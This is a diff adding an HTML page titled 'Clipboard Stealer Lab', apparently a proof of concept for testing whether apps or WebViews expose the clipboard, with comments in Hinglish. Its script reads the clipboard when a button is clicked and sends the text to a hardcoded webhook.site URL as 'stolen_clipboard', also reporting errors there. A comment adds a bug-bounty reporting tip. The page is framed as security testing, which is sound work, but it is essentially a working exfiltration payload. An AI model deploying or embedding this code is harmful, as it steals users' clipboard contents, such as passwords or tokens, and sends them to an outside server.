@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Clipboard Stealer Lab</title>
+    <style>
+        body { font-family: sans-serif; background: #0d1117; color: white; padding: 20px; text-align: center; }
+        .box { background: #161b22; border: 1px solid #30363d; padding: 20px; border-radius: 10px; }
+        button { background: #238636; color: white; padding: 15px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; }
+        .status { color: #58a6ff; margin-top: 15px; font-family: monospace; }
+    </style>
+</head>
+<body>
+
+    <div class="box">
+        <h3>Clipboard Data Access Test</h3>
+        <p>Is button pe click karte hi app ka clipboard read karne ki koshish hogi.</p>
+        
+        <button onclick="readAndSteal()">Click to "Paste" & Steal</button>
+        
+        <div id="status" class="status">Status: Waiting for interaction...</div>
+    </div>
+
+    <script>
+        // CHANGE THIS: Apna Webhook URL yahan dalo
+        const webhookURL = "https://webhook.site/f1738809-1a2e-4085-a7d6-e448a2a477b3";
+
+        async function readAndSteal() {
+            const statusDiv = document.getElementById('status');
+            statusDiv.innerText = "Attempting to read clipboard...";
+
+            try {
+                // 1. Clipboard Read API (Modern Browser/WebView)
+                const text = await navigator.clipboard.readText();
+                
+                if (text) {
+                    statusDiv.innerHTML = "Success! Stole: <br><code>" + text + "</code>";
+                    
+                    // 2. Data ko Webhook pe exfiltrate karna
+                    fetch(webhookURL + "?stolen_clipboard=" + encodeURIComponent(text))
+                    .then(() => {
+                        console.log("Data sent to attacker server.");
+                    });
+                } else {
+                    statusDiv.innerText = "Clipboard is empty.";
+                }
+
+            } catch (err) {
+                // 3. Fallback: Agar Read access denied hai
+                statusDiv.innerText = "Error: " + err + "\n(App blocked automatic read access)";
+                
+                // Reporting Tip: Agar yahan "Permission Denied" ke bajaye prompt aata hai,
+                // toh wo security standard hai. Agar bina puche text aa gaya, toh ye High Vulnerability hai.
+                fetch(webhookURL + "?error=access_denied&details=" + encodeURIComponent(err));
+            }
+        }
+    </script>
+</body>
+</html>
